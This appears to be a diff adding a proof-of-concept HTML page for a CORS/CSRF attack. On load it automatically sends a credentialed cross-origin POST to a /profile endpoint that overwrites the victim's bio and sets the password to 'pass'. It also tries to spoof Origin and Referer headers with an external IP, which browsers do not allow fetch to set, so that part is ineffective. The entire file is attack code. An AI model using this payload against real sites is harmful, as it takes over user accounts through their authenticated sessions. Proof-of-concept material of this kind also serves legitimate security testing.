@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC Auto Trigger</title>
+</head>
+<body>
+  <h1>Sending CORS PoC request...</h1>
+
+  <script>
+    window.onload = function () {
+      fetch("https://localhost/profile", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "*/*",
+          "Referer": "https://34.240.136.99/profile",
+          "Origin": "https://34.240.136.99"
+        },
+        body: JSON.stringify({
+          bio: "Hi, I am Alice!",
+          password: "pass"
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log("Response:", data);
+        alert("Request sent ✅");
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("❌ Request failed");
+      });
+    };
+  </script>
+</body>
+</html>
